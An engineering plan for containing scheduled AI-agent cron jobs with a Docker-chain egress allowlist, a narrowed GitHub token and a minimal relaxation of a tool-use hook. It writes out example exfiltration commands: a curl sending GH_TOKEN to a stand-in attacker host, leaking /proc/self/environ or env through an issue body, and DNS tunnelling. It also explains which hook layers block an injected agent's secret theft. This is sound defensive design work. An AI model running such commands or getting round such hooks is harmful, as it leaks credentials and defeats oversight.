---
title: "Tier-2: Cron Egress Firewall + Least-Privilege Token + Restore Paused Crons"
type: feat
issue: "#5046"
related: "#5018"
branch: feat-tier2-cron-egress-firewall
lane: cross-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
created: 2026-06-09
---

# Tier-2: Cron Egress Firewall + Least-Privilege Token + Restore Paused Crons

🛡️ Follow-up to Tier-1 PR #5018 (MERGED 2026-06-08). Brainstorm + decisions:
`knowledge-base/project/brainstorms/2026-06-09-tier2-cron-egress-firewall-brainstorm.md`.
Spec: `knowledge-base/project/specs/feat-tier2-cron-egress-firewall/spec.md`.
**Plan-review applied (2026-06-09):** firewall-only containment (content-publisher→GHA deferred);
allowlist-first egress mechanism (no SNI proxy up front); token narrowing folded into PR-1; restore
re-triage owned explicitly. See `## Plan-Review Resolution`.

## Enhancement Summary

**Deepened on:** 2026-06-09 · **Agents:** security-sentinel, architecture-strategist,
framework-docs-researcher (GitHub App token API), Explore (nftables DOCKER-USER egress).

**Re-deepened on:** 2026-06-09 (PR-2 Phase-2 full-AC pass) · **Agents:** security-sentinel
(relax-vs-remove + sub-agent hook inheritance), architecture-strategist (precedent-diff + apply-path +
nft atomicity), Explore ×4 (nftables/systemd/DNS production design, allowlist-host fact-verification,
network-outage deep-dive, per-cron restore-class + token audit). **PR-2 is now resolved as TWO
reconciled deliverables** — the original Phase 2 framed it as firewall-only and carried a stale
assumption ("restores the needs-firewall crons") that PR-1's `## Work-Phase Resolution` already
contradicted. See `### Phase 2` (rewritten) + `## PR-2 Acceptance Criteria` (full) + `## Network-Outage
Deep-Dive (PR-2)`.

### PR-2 deepen — key corrections (verified against the codebase)
1. **The firewall alone restores ZERO crons → PR-2 must also relax the #5018 hook.** PR-1 proved the
   hook (not egress) blocks all 11 (`cron-bash-allowlist-hook.mjs` catch-all denies `Task`/`Skill`;
   metachar layer denies `$()`/pipes/`node -e`). Decision: **RELAX-MINIMAL** — drop ONLY the
   `Task`/`Skill` catch-all (`:340-344`); KEEP every Bash-containment layer AND keep
   `WebFetch`/`WebSearch`/`mcp__*` denied. The L3 firewall is **content-blind + off-allowlist-only**, so
   it does NOT subsume the hook's *secret-in-context* severance (`SECRET_PATH_PATTERNS`, metachar/allowlist
   Bash, `argumentInjectionReason`, `gitVerbReason`). Relax-moderate (dropping metachar) and remove-entirely
   were both **rejected** — they re-open the Bash-secret-read → on-allowlist-exfil path the firewall is
   blind to (violates TR4 + ADR-033 I7).
2. **Honest restore count: relax-minimal restores 2 crons, not "the needs-firewall set."** Only
   `cron-agent-native-audit` + `cron-legal-audit` are blocked *solely* by the Task catch-all. The other 9
   need per-construct Bash-allowlist refinement (campaign-calendar / competitive-analysis / growth-audit /
   seo-aeo-audit / content-generator / growth-execution — evidence-gated future work) OR stay
   firewall-dependent for non-GitHub egress (bug-fixer, community-monitor, ux-audit). This mirrors PR-1's
   R3 realization — surface it, don't silently over-promise. **The firewall's primary value is containing
   the 4 LIVE spawn-bash crons that run UNCONTAINED today** (content-publisher, content-vendor-drift,
   rule-prune, weekly-analytics — ADR-033 I7), plus *enabling* the 2-cron relax-minimal restore.
3. **Sub-agent hook inheritance is the gate for allowing `Task`.** Sub-agents DO inherit the hook
   (auto-discovered `repo/.claude/settings.json` under a `*` matcher, no `--settings` flag;
   `_cron-claude-eval-substrate.ts:322-326`/`:214-217`; Task surfaces as `tool_name:"Agent"`). But this is
   *inferred*, not probe-verified for a sub-agent's *interior* Bash. **NEW AC:** a Phase-0-style probe
   (Task sub-agent attempting `cat /proc/self/environ` → assert `deny`) gates the relaxation; if it
   fails-open, `Task` stays denied.
4. **Firewall + hook-relax must land ATOMICALLY, gated on a live deny-proof.** `nft -f` exits 0 on an
   inert ruleset (the silent-green failure this umbrella exists to prevent). The provisioner's post-apply
   assertion MUST include a live positive+negative container probe — and that proof is a **merge
   precondition** for the hook diff, else crons run uncontained at BOTH layers.

### Key corrections (all verified against the codebase / GitHub docs)
1. **Token default was insufficient → BLOCKER.** `{ contents:write, issues:write }` 403s on
   `gh pr create` (`_cron-claude-eval-substrate.ts:148`). PR creation needs **`pull_requests:write`**.
   AC3 would have passed green while restored crons half-fail (branch pushed, no PR) — the exact
   silent-green mode. Corrected default: `{ contents, issues, pull_requests }:write` + assert the
   `repositories` scope ships, not just `permissions` (bounds a leaked token to single-user incident).
2. **Inngest was misclassified as internet egress → would self-lockout.** Inngest is self-hosted at
   `http://host.docker.internal:8288` (host-gateway), NOT an external host. PR-2 must explicitly allow
   the **host-gateway :8288 rule**; Sentry-ingest is the ONLY external observability dependency.
   Better Stack/Vector is **host** egress (host journald) — removed from the container allowlist.
3. **Re-resolve-vs-proxy: allowlist-first confirmed decisive** — the IP-rotation race is fail-loud and
   self-correcting (block → Sentry `egress_blocked` + missed heartbeat → visibly-late cron output); the
   proxy is a standing SPOF. PR-2 conditions added: **additive-then-prune** set updates (never
   flush-empty) + **alarm on the re-resolve timer-unit failure**.
4. **DNS-exfil + content-blind residuals named honestly** (security): container UDP/53 pinned to a
   logged resolver; the 4 hook-bypassing spawn-crons stay content-blind behind the firewall (widens
   #5073's re-eval criterion); dry-run stopgap is NOT injection mitigation (AC4 reworded).

### New considerations
- DOCKER-USER rule must match the **bridge interface explicitly** (not a blanket DROP — would catch
  host-gateway/inter-container return traffic). Apply-path self-lockout confirmed **safe** (host :22 +
  CF tunnel untouched). Advisory: create an ADR for the egress-firewall primitive at PR-2.

## Overview

Two cron populations need different containment:

- **11 paused claude-crons** (`TIER2_DEFERRED_CRONS`, `_cron-shared.ts:196`) — *candidates* for
  restoration via the existing #5018 `PreToolUse` hook (`cron-bash-allowlist-hook.mjs`) + per-cron
  `CRON_BASH_ALLOWLISTS` (`_cron-claude-eval-substrate.ts:139`), **only for the subset that PR-1's
  triage proves finitely-allowlistable** (see the re-triage note below).
- **4 live `spawn("bash")` crons** (`content-publisher`, `content-vendor-drift`, `rule-prune`,
  `weekly-analytics`) — bypass the hook (ADR-033 I7), running **uncontained today**. Contained by a
  container-scoped (`DOCKER-USER` chain) egress allowlist (PR-2).

**Re-triage note (Kieran C1).** The defer-set's recorded rationale (`_cron-shared.ts:183`) is "bash
that *cannot* be expressed as a finite allowlist." So restoring any of the 11 *via allowlist*
necessarily **re-triages** the original Tier-1 classification — asserting it was too coarse for the
read-heavy audit crons. This plan owns that: PR-1 produces bash-surface evidence **before** any
restore commitment (AC1). Restore is therefore "independent of the firewall" **only for the subset
proven allowlistable**; the rest wait for PR-2.

Operator decisions: **firewall-only containment** (content-publisher→GHA deferred — see `## Deferred`)
+ **restore-first sequencing** + **allowlist-first egress mechanism**. Two PRs. PR-1 (restore + token)
is this branch; PR-2 (firewall) is a sequenced follow-on branch, deepen-planned when reached.

## Research Reconciliation — Spec vs. Codebase

| Issue-body / spec claim | Reality (verified) | Plan response |
|---|---|---|
| `CRON_BASH_ALLOWLISTS` in `_cron-shared.ts` | `_cron-claude-eval-substrate.ts:139` (`Record<string,string[]>`, consumed `:316` `?? []` → fail-closed). `TIER2_DEFERRED_CRONS` is `_cron-shared.ts:196`. | Edit the substrate file for allowlists; the defer-set in `_cron-shared.ts`. |
| Restore the 11 "via allowlist" is independent of the firewall | Defer-set *definition* = "cannot be finitely allowlisted" (`_cron-shared.ts:183`). | Re-triage explicitly; evidence-before-restore (AC1); independence holds only for the allowlistable subset. |
| Egress allowlist = "anthropic + github + community **read** APIs" | `content-publisher` does social **writes** (`*_ALLOW_POST:"true"`, 12 secrets); `weekly-analytics` POSTs Discord. Inngest is self-hosted (host-gateway), NOT external. | **External allowlist:** Anthropic, `github.com`+`api.github.com`, Sentry-ingest (only external observability dep), Supabase (REST+realtime), Doppler, Flagsmith, social-write hosts, Discord webhook. **Host-gateway rule:** Inngest :8288. **Excluded:** Better Stack/Vector (host egress), GHCR (host dockerd). |
| Host "provisioned outside this IaC" | Host IS Terraform-managed: `hcloud_server.web` (`server.tf:21`), `hcloud_firewall.web` (`firewall.tf:1`, inbound-only). | Egress added via the SSH-provisioner path (`docker_seccomp_config` template, `server.tf:573`). |
| `generateInstallationToken` "broadly scoped" | POSTs no body (`github-app.ts:708-733`) → full default grant; narrowing params unused. ~10 call sites incl. interactive routes. | Narrow at the **cron-only** `mintInstallationToken` (`_cron-shared.ts:119`); folded into PR-1. |
| Firewall "on the cron worker" (host-level implied) | Host outbound is the control plane: cloudflared tunnel (app + CI-deploy SSH route #4829), GHCR, Doppler, apt, Sentry. Container runs on the default Docker bridge (`ci-deploy.sh:457,635`, no `--network`). | Scope egress to the **container** via `DOCKER-USER` — NOT host OUTPUT. |

## Hypotheses — Egress-firewall self-lockout (L3→L7 discipline)

The Network-Outage gate fired on `firewall` + SSH-provisioner `terraform apply`. This plan **adds** a
firewall, so the discipline is applied to the outage it could *cause*. Unverified layers first:

1. **L3 — host control-plane egress (cloudflared tunnel).** Host dials OUT to CF edge for the tunnel
   serving ALL app traffic + the CI-deploy SSH route (#4829, `server.tf:346`). Host-level OUTPUT
   default-drop severs this → full outage + un-deployable host. **Mitigation: `DOCKER-USER` scoping
   (container only); never touch host OUTPUT.** [Kieran verified: container on default bridge, so
   DOCKER-USER catches container egress incl. `spawn("bash")` children, leaves host OUTPUT untouched.]
2. **L3 — container required egress (allowlist).** Two distinct mechanisms (arch §2/§4 corrected this):
   - **External egress allowlist:** `api.anthropic.com`, `github.com` + `api.github.com`, the **Sentry
     ingest cluster host** (the ONLY external observability dep — else heartbeats POST-fail silently →
     monitors dark, `_cron-shared.ts:163`), Supabase (separate REST `*.supabase.co` + realtime
     `wss://*.supabase.co` hosts — verify both at PR-2), Doppler, Flagsmith (`edge.api.flagsmith.com`),
     social-write hosts (X/LinkedIn/Bluesky), Discord webhook. Each verified reachable in PR-2's deny-list AC.
   - **Host-gateway allow rule (NOT internet egress):** **Inngest is self-hosted** at
     `http://host.docker.internal:8288` (`ci-deploy.sh:556`), reached via `--add-host …:host-gateway`.
     PR-2 MUST explicitly allow the host-gateway address on :8288 — else default-drop severs the
     container→Inngest link the **fail-loud throw depends on** (the R2 inversion, one layer lower).
   - **NOT in the container allowlist:** Better Stack/Vector (host egress — `vector.toml` reads host
     journald), GHCR (host dockerd pulls images). Listing them only causes scope confusion.
3. **L3 — the apply path.** nftables applied via SSH `terraform_data` provisioner (admin_ips-gated :22,
   or CF-tunnel in CI). DOCKER-USER scoping leaves host :22 untouched, so the provisioner's return path
   survives. A `connection reset` on apply = admin-IP drift (`/soleur:admin-ip-refresh`), NOT firewall —
   `hr-ssh-diagnosis-verify-firewall`. [verified: SSH:22 ingress admin_ips-only, `firewall.tf:5`]
4. **L7 — fail-loud on block.** A denied egress surfaces (Sentry `egress_blocked` + Inngest throw →
   missed heartbeat), never green. [Observability + PR-2 AC]

## Network-Outage Deep-Dive (PR-2)

Mandatory (deepen-plan Phase 4.5 — this plan adds a firewall + an SSH `terraform_data` provisioner).
L3→L7 discipline applied to the outage the firewall could *cause*:

| Layer | Check | Status | Artifact / gap |
|---|---|---|---|
| **L3 — host control-plane (CF tunnel)** | DOCKER-USER scoping leaves host OUTPUT untouched | **VERIFIED** | `firewall.tf` inbound-only (no egress rules); CF tunnel daemon dials OUT at host level (`server.tf:43,346` #4829); DOCKER-USER filters bridge-FORWARD only. |
| **L3 — apply-path (SSH provisioner return)** | the provisioner's SSH :22 return path survives the firewall | **VERIFIED** | SSH :22 ingress is admin_ips-only (`firewall.tf:5-12`); DOCKER-USER never touches host INPUT/OUTPUT; CF-tunnel SSH route (#4829) is host OUTPUT. Connection-reset diag ordering = admin-IP drift FIRST (`hr-ssh-diagnosis-verify-firewall`). |
| **L3 — DNS/routing (allowlist + resolver pin)** | container's OWN required resolution still works while arbitrary resolvers are denied | **CLOSE AT /work** | Rule 2 (Phase 2.B) pins UDP/53 to one resolver + drops others. Must snapshot the resolved IPs per allowlisted host at provision time + prove the container can still resolve `api.anthropic.com` etc. (AC-P2.4/2.6). |
| **L7 — TLS/SNI proxy** | N/A | **N/A (deferred by design)** | No SNI proxy up front — the re-resolve race is fail-loud/self-correcting; a proxy is a standing SPOF (dies → all crons dark). Escalate only on evidence of production churn that defeats re-resolve. |
| **L7 — fail-loud on block** | a denied egress surfaces, never green | **CLOSE AT /work** | Requires BOTH the Sentry-ingest external allow (AC-P2.4) AND the host-gateway :8288 allow (AC-P2.5) intact — else the fail-loud signal itself goes dark. Proven by AC-P2.10 (simulated block → `egress_blocked` + missed heartbeat). |

**No gap blocks the plan; three items are closed by PR-2 ACs** (DNS snapshot/pin → AC-P2.4/2.6; fail-loud
→ AC-P2.10; the live positive+negative provisioner probe → AC-P2.8, which is the merge precondition for
the coupled hook relaxation).

## User-Brand Impact

**If this lands broken, the user experiences:** a restored cron silently fails (allowlist gap) and the
founder loses weekly output with monitors green; OR (PR-2) the cloudflared tunnel is severed and the
whole app + deploy path goes dark.

**If this leaks, the user's data/credentials are exposed via:** an over-broad installation token
(cross-repo write) or an egress gap on a `spawn("bash")` cron exfiltrating agent-context
(`ANTHROPIC_API_KEY`, `GH_TOKEN`, KB/operator-prompt content) to an attacker endpoint. KB/prompt
content can contain personal data → conditional GDPR Art. 33 72h clock (CLO; gdpr-gate confirmed no
schema/Chapter-V finding, CLO carry-forward sufficient).

**Brand-survival threshold:** single-user incident. → CPO sign-off carried forward from brainstorm
Phase 0.1; `user-impact-reviewer` runs at PR review.

## Implementation Phases

### Phase 1 — PR-1: Restore allowlistable crons + narrow the cron token (THIS branch)

**1.0 Per-cron containment re-triage (evidence-first; AC1 gates on this).** For each of the 11 in
`TIER2_DEFERRED_CRONS`, read its prompt's actual bash surface and classify with cited evidence:
- **allowlistable** → add a `CRON_BASH_ALLOWLISTS[<cron>]` entry modeled on the proven
  `cron-roadmap-review` entry (`_cron-claude-eval-substrate.ts:139`); remove from `TIER2_DEFERRED_CRONS`.
- **needs-firewall** (broad/dynamic bash — e.g. likely `bug-fixer` (creates PRs, runs tests),
  `growth-execution`, `content-generator`) → stays deferred; restored in PR-2.

  ⚠️ Do NOT pre-commit the split. The named candidates are hypotheses; the evidence decides. If
  `bug-fixer` (CPO's #1 restore priority) is needs-firewall, wave-1 becomes the proven-allowlistable
  audit crons and `bug-fixer` waits for PR-2 — surface this in the PR body, don't silently reshuffle.

**1.1 Restore the allowlistable subset; un-pause operationally in waves.** Land all proven-allowlistable
crons' allowlist entries + defer-set removals in PR-1 (one code change). The "waves of 2–3,
output-quality-gated" cadence (CPO) is **operational pacing of the un-pause**, not separate PRs or a
code-safety gate — roll out via the trigger schedule so the solo founder isn't re-flooded with 11
producers at once. Validate each via `/soleur:trigger-cron <event>`: output issue appears +
`runHookSelfTest` passes.

**1.2 Interim posture for the live 4 (decide IN this PR — Kieran).** Restore-first *adds* autonomous
surface while the firewall (PR-2) lags. **Be honest about what the stopgap does (security F2):** flipping
`content-publisher`'s `*_ALLOW_POST` to dry-run only suppresses *social posts* — it does **NOT** mitigate
the injection/exfil vector (a `spawn("bash")` child can still `curl https://attacker/?d=$GH_TOKEN`). So
the interim posture for the exfil vector is **"accept the bounded window (first-party prompts/scripts),
expedite PR-2 immediately after PR-1"** — not "mitigated by dry-run." Record this framing in AC4; the
dry-run flip (if chosen) is a blast-radius reduction for one cron's posting only.

**1.3 Narrow the cron token (folded from former PR-4 — DHH; corrected by security + docs).** Same
`_cron-shared.ts` file PR-1 already edits: add an additive `permissions?` option on
`mintInstallationToken` (`:119`), passed as the POST body `generateInstallationToken`
(`github-app.ts:708-733`) currently omits.
- **Default permissions = `{ contents: "write", issues: "write", pull_requests: "write" }`** — `pull_requests:write`
  is REQUIRED (the fleet runs `gh pr create` at `_cron-claude-eval-substrate.ts:148`; `contents:write`
  covers only the `git push`, not opening the PR → 403 without it). `git push`=contents; issue/PR
  comments=issues; create/merge PR=pull_requests.
- **The `repositories` scope MUST also ship** (`repositories: ["soleur"]` or `repository_ids`) and be
  asserted — not just `permissions`. This bounds a token leaked-into-a-public-issue to single-user
  incident (can't be replayed cross-repo). (security F4)
- **Ceiling check:** the GitHub App install-time manifest is the hard ceiling — the access_tokens POST
  can only narrow within it, never widen. Confirm the App grants `pull_requests` write at install time,
  or the token request itself fails. (docs + arch confirmed)
- Do NOT touch the ~10 non-cron call sites. Test the override (seed bogus ambient `GH_TOKEN`, assert
  subprocess sees the minted **narrowed** token AND the `repositories`/`permissions` shape).

### Phase 2 — PR-2: Container egress firewall + minimal hook relaxation (separate branch; THIS deepen)

PR-2 is **two reconciled deliverables** that must land **atomically** (the relaxation is only safe once
the firewall is *proven live*): **(A)** relax the #5018 containment hook to the minimum that lets ≥1 cron
restore, and **(B)** the DOCKER-USER container egress firewall that makes (A) safe and contains the 4
live spawn-bash crons. Then **(C)** restore + token-narrow the crons (A) unblocks.

#### Phase 2.A — Hook relaxation: RELAX-MINIMAL (security-sentinel, adversarial)

**Decision: relax-minimal.** In `cron-bash-allowlist-hook.mjs`, change ONLY the `decide()` catch-all
(`:340-344`) from `default: deny` to an explicit **`Task` → allow, `Skill` → allow, everything-else →
deny** (preserve fail-closed-on-unknown: a *new* tool class still denies). **KEEP unchanged:** the
metachar layer (`dangerousMetacharReason`, `:136`), allowlist-prefix Bash enforcement (`:308`),
`SECRET_PATH_PATTERNS` (`:74`), `gitVerbReason` (`:221`), `argumentInjectionReason` (`:199`),
`WRITE_PROTECTED_PATTERNS` (`:95`), AND the catch-all denial of `WebFetch`/`WebSearch`/`mcp__*` (no
restored cron needs them; they are pure additional egress surface).

**Why not relax-moderate (also drop metachar) or remove-entirely:** the L3 firewall is **content-blind
and severs only OFF-allowlist egress**. The hook's own threat model (`:23-33`) severs exfil at TWO
points — *(a) secret-in-context* AND *(b) egress*; the firewall only attacks (b), and only off-allowlist.
`SECRET_PATH_PATTERNS` governs only the Read/Glob/Grep tools — `cat /proc/self/environ` via the **Bash**
tool is stopped ONLY by the metachar+allowlist Bash layer (hook comment D0b, `:14-15`). Dropping that
layer re-admits Bash secret-reads, which then exfil over an **on-allowlist** channel
(`gh issue create --body "$(cat /proc/self/environ)"` to the public repo over allowlisted
`api.github.com`) the firewall cannot see. Relax-moderate and remove-entirely both re-open the canonical
P0-A vector → **rejected** (violate TR4 + ADR-033 I7).

**Sub-agent inheritance gate (`Task` safety).** Allowing `Task` is safe *only because* sub-agents inherit
the same PreToolUse hook — registration is via the auto-discovered project `repo/.claude/settings.json`
under a `*` catch-all matcher (`_cron-claude-eval-substrate.ts:322-326`, `:214-217`; **no `--settings`
flag**), and the Task tool surfaces as `tool_name:"Agent"` which the `*` matcher catches. This is
**inferred from the architecture, NOT probe-verified for a sub-agent's interior Bash** (the committed
Phase-0 probes test the catch-all denying `Task` *itself*, not a sub-agent's nested Bash). **Gate (AC):**
extend `runHookSelfTest` (`_cron-claude-eval-substrate.ts`) with a spawn-time probe that runs a `Task`
sub-agent whose body attempts `cat /proc/self/environ` and asserts `permissionDecision:"deny"`. If it
fails-open, `Task` stays denied and the relaxation does not ship.

**Honest restore scope under relax-minimal: 2 crons.** Only `cron-agent-native-audit` (Task: 8
sub-agents) and `cron-legal-audit` (Task: legal-compliance-auditor) are blocked *solely* by the Task
catch-all → both restore. The other 9 stay deferred: 6 PR-flow crons (campaign-calendar,
competitive-analysis, growth-audit, seo-aeo-audit, content-generator, growth-execution) need
per-construct Bash-allowlist refinement (`date -u`, dynamic `checkout -b`, `npx eleventy` — **evidence-gated
future work**, NOT a blanket metachar drop); bug-fixer / community-monitor / ux-audit stay
firewall-dependent for non-GitHub egress. This is the PR-1-R3 honesty pattern — surface in the PR body,
do not over-promise.

#### Phase 2.B — Container egress firewall (the durable boundary)

**Mechanism: allowlist-first (operator-chosen; deepen confirmed decisive).** nftables rules in the
**`DOCKER-USER` chain**, matched on the **default-bridge interface explicitly** (`iifname "docker0"` — the
container runs on the default bridge: `docker run` in `ci-deploy.sh:474-488,652-674` has **no `--network`
flag**). NOT a blanket `-j DROP` (would catch host-gateway / inter-container return traffic). Rule order
(first-match-wins, drop LAST):
1. `ct state established,related accept` (return traffic).
2. **DNS pin** (cond. c): `udp dport 53 ip daddr <pinned-resolver> accept`, then `udp dport 53 log
   prefix "egress-dns-exfil: " drop` — pins container DNS to one logged resolver (the `docker0` gateway /
   host stub) so a compromised cron can't tunnel `<base32-secret>.attacker.com`.
3. **Host-gateway Inngest** (NOT internet egress): `ip daddr <bridge-gw> tcp dport 8288 accept`. Derive
   `<bridge-gw>` at rule-build time — `docker network inspect bridge -f '{{(index .IPAM.Config
   0).Gateway}}'` (default `172.17.0.1`, but DO NOT hardcode — a `bip`/`default-address-pools` change
   shifts it). Self-hosted Inngest at `host.docker.internal:8288` (`ci-deploy.sh:482-483,660-661`); the
   fail-loud throw depends on this.
4. `ip daddr @egress_allowlist accept` — the named set (`type ipv4_addr; flags interval`) of resolved
   external-host IPs.
5. `iifname "docker0" log prefix "egress-blocked: " level notice` then `iifname "docker0" drop` (the
   fail-loud + default-drop).

**External allowlist** (resolved into `@egress_allowlist`; consolidated from fact-verification, each with
file:line evidence in the deny-list AC): `api.anthropic.com`, `github.com`, `api.github.com`,
**`<SENTRY_INGEST_DOMAIN>`** (matches `/^[a-z0-9.-]+\.sentry\.io$/i`, `_cron-shared.ts:88,189` — the ONLY
external observability dep, operator-configured so resolve from the live env at provision time),
`<ref>.supabase.co` (REST **and** realtime/WSS share the host), `api.doppler.com`
(`_predicate-validator.ts:21`), `edge.api.flagsmith.com` (`lib/feature-flags/server.ts:10`), `api.x.com`,
`api.linkedin.com`, `bsky.social` (+ verify `*.bsky.network` need at AC time), `discord.com`,
**`plausible.io`** (`scripts/weekly-analytics.sh:25` — NEW: weekly-analytics fetch; was missing from the
original allowlist). **NOT in the container allowlist** (host egress): Better Stack/Vector
(`infra/vector.toml:313`, reads host journald), GHCR (`ghcr.io`, host dockerd).

**Hard conditions for the re-resolve (arch — mechanism confirmed):**
- (a) **Additive-then-prune, atomically.** A host-side systemd timer resolves hostnames → IPs and writes
  a generated `nft -f` file with an **add block then a delete block** (a single `nft -f` runs as one
  atomic transaction — no intermediate empty-set window). Per-element `nft add element` / `nft delete
  element` on the **named set**; NEVER `flush set` + repopulate. **Fail-safe:** if resolution returns
  empty (transient DNS outage), abort the update — do NOT prune to an empty allowlist.
- (b) **Timer-unit failure MUST alarm** (a dead timer freezes the set → progressive then total egress
  loss as IPs rotate). `OnFailure=` → a oneshot that pings a Better Stack/Sentry heartbeat; plus a
  success-heartbeat the monitor expects (`hr-observability-as-plan-quality-gate`).
- (c) DNS-exfil control — see rule 2 above; the deny-list AC includes a DNS-exfil-over-UDP/53 test.

**Persistence (arch — Docker re-asserts its own rules on `dockerd` restart).** Load the ruleset as a
**boot-persistent unit that re-asserts on every boot**, mirroring `docker_seccomp_config`'s boot-persistent
oneshot pattern (`server.tf:617-624`) — a one-time `nft` insert is not drift-proof (lost on the frequent
`ci-deploy.sh` container redeploys / daemon restarts). Flush only THIS ruleset's named-set-backed rules
(stable comment/handle), never the whole chain.

**Wildcard hosts.** `*.supabase.co` / `*.bsky.network` have no resolvable wildcard A record — enumerate
the specific subdomains the code uses (`<ref>.supabase.co`, `bsky.social`). A subdomain IP rotating
between resolve cycles is fail-loud/self-correcting (re-resolve cadence ≪ SaaS DNS TTL), not silent-green.

**Apply path (arch precedent-diff confirmed SAFE).** A **9th `terraform_data "cron_egress_firewall"` SSH
provisioner** modeled exactly on `docker_seccomp_config` (`server.tf:573`): map-form `triggers_replace = {
rules_hash = sha256(file("${path.module}/cron-egress-nftables.sh")), server_id = hcloud_server.web.id }`
(`server_id` fold mandatory — `hr-fresh-host-provisioning`; use `hcloud_server.web.id`, NOT
`ipv4_address`); `connection{type="ssh"}` byte-identical to the 8 siblings; **positive post-apply
assertions** (see PR-2 ACs). This is an **addition to the existing `apps/web-platform/infra/` root, NOT a
new root** → `hr-every-new-terraform-root` does not fire (no new backend/`.test.sh` root-guard). Add
`-target=terraform_data.cron_egress_firewall` to the **SSH-provisioner apply block**
(`apply-web-platform-infra.yml:520-528`, the CF-tunnel SSH path), NOT the saved-tfplan block;
`terraform-target-parity.test.ts` (`MIN_SSH_PROVISIONED`, `>=`, union-coverage) **fail-closes on omission
with no test edit** (verify the count bumps to the new sibling total at /work). Mirror into
`cloud-init.yml` (base64 `write_files`) for **fresh hosts only** — cloud-init is **dead on the running
host** (`ignore_changes=[user_data]`, `server.tf:57`), so the SSH provisioner is the sole live apply path.
DOCKER-USER scoping leaves host :22 (`firewall.tf:5`, admin_ips) and the CF-tunnel SSH route (#4829,
`server.tf:346`) untouched → apply-path self-lockout **safe**; a connection-reset on apply = admin-IP
drift (`/soleur:admin-ip-refresh`), NOT firewall (`hr-ssh-diagnosis-verify-firewall`).

**Create an ADR** for the container-egress primitive (`/soleur:architecture create`; cross-ref ADR-033 I7
— the spawn-bash hook-bypass the firewall closes; AP-001 upheld, AP-002 advisory-tier exception consistent
with the 8 sanctioned siblings).

#### Phase 2.C — Restore + token-narrow the 2 unblocked crons

Remove `cron-agent-native-audit` + `cron-legal-audit` from `TIER2_DEFERRED_CRONS` (`_cron-shared.ts:222`).
Both are **issue-creators only** (`gh issue create/list/view`) → both are **narrowed-token-eligible**:
apply the PR-1 `DEFAULT_CRON_TOKEN_PERMISSIONS` = `{contents,issues,pull_requests}:write` +
`repositories:["soleur"]` via `mintInstallationToken` **before un-pausing** (bounds the #5073 on-allowlist
residual for them — they are NOT in PR-1's narrowed set today). Validate each via
`/soleur:trigger-cron <event>`: output issue appears + `runHookSelfTest` (incl. the new Task-probe) passes.

## Deferred

- **content-publisher → ephemeral GHA runner (former PR-3).** Deferred per plan-review (DHH +
  code-simplicity): once PR-2's container egress boundary exists, the 12 social secrets cannot
  exfiltrate off-allowlist, so the GHA move is a second mitigation for an already-closed threat.
  **Re-evaluation criterion:** revisit only if PR-2's allowlist proves insufficient for
  `content-publisher` specifically (e.g., it needs an unbounded/dynamic egress set the allowlist can't
  express). Tracked as follow-up **#5073**. The Option-C pattern is ready when
  needed (`trigger-workflow.ts` precedent: `cron-terraform-drift`, `cron-dev-migration-drift`,
  `cron-main-health-monitor`, `cron-review-reminder`).
  **Re-eval criterion widened (security F3.1):** also revisit if the firewall's content-blindness
  proves load-bearing — the 4 spawn-crons **bypass the #5018 hook** (ADR-033 I7), so after PR-2 a
  compromised spawn-cron can still `gh issue create --body "$(env)"` to the **public** soleur repo over
  allowlisted `api.github.com` (the firewall is content-blind). GHA isolation (#5073) is the layer that
  would close this. Bounded to single-user incident by the repo-scoped token (Phase 1.3), but the
  deferral is a deliberate residual, not a no-op. Recorded honestly here so #5073 isn't mis-read as
  "purely redundant."

## Files to Edit

**PR-1 (this branch):**
- `apps/web-platform/server/inngest/functions/_cron-shared.ts` — remove restored crons from `TIER2_DEFERRED_CRONS` (`:196`); add `permissions?` to `mintInstallationToken` (`:119`).
- `apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts` — add `CRON_BASH_ALLOWLISTS` entries (`:139`).
- `apps/web-platform/server/github-app.ts` — thread the `permissions`/`repositories` POST body into `generateInstallationToken` (`:708-733`), additive + defaulted (cron path only).
- `apps/web-platform/test/server/inngest/cron-shared.test.ts` — assert defer-set/allowlist for restored crons + the token override (bogus ambient `GH_TOKEN` → minted narrowed token).
- (PR-1.2) `apps/web-platform/server/inngest/functions/cron-content-publisher.ts` — *only if* the dry-run stopgap is chosen.

**PR-2 (separate branch — TWO deliverables):**
- *Hook relax (2.A):* `apps/web-platform/server/inngest/cron-bash-allowlist-hook.mjs` (surgical catch-all:
  `Task`/`Skill`→allow, else deny); `apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts`
  (extend `runHookSelfTest` with the Task-sub-agent secret-read probe).
- *Firewall (2.B):* `apps/web-platform/infra/server.tf` (new `terraform_data "cron_egress_firewall"` SSH
  provisioner), `apps/web-platform/infra/cloud-init.yml` (fresh-host mirror), `.github/workflows/apply-web-platform-infra.yml`
  (add `-target=terraform_data.cron_egress_firewall` to the SSH apply block),
  `apps/web-platform/infra/sentry/issue-alerts.tf` (`egress_blocked` alert, modeled on `kb_sync_silent_failure`).
- *Restore + token (2.C):* `apps/web-platform/server/inngest/functions/_cron-shared.ts` (remove
  `cron-agent-native-audit` + `cron-legal-audit` from `TIER2_DEFERRED_CRONS:222`; apply narrowed token to both);
  `apps/web-platform/test/server/inngest/cron-shared.test.ts` (assert defer-set removal + token scope);
  hook unit test (assert surgical catch-all + unchanged denial layers).
- *Tests/guards:* `cron-egress-nftables.test.sh` (drift guard for the new script, per `hr-every-new-terraform-root`-style
  guard convention for the infra root addition).

## Files to Create

- `apps/web-platform/infra/cron-egress-nftables.sh` — the DOCKER-USER ruleset loader (PR-2).
- `apps/web-platform/infra/cron-egress-resolve.sh` — the hostname→IP re-resolve script (additive-then-prune,
  fail-safe-on-empty) (PR-2).
- `apps/web-platform/infra/cron-egress-resolve.{service,timer}` — systemd units (timer + `OnFailure=`/
  `OnSuccess=` heartbeat) (PR-2).
- `cron-egress-nftables.test.sh` — drift/lint guard for the new infra script (PR-2).
- A new ADR for the container-egress primitive under `knowledge-base/engineering/architecture/decisions/`
  (cross-ref ADR-033 I7) (PR-2).

## Open Code-Review Overlap

None (checked `gh issue list --label code-review --state open` against PR-1 files; no open scope-out names `_cron-shared.ts` / `_cron-claude-eval-substrate.ts` / `github-app.ts`).

## Acceptance Criteria

### PR-1 — Pre-merge
- AC1 — Each of the 11 classified allowlistable | needs-firewall in the PR body **with cited bash-surface evidence per cron** (evidence precedes any restore commitment). Per-cron evidence MUST confirm the allowlist for each restored cron **excludes** `gh api` with arbitrary method + raw `curl`/`wget` (else the hook's exfil defense is defeated — security F4a).
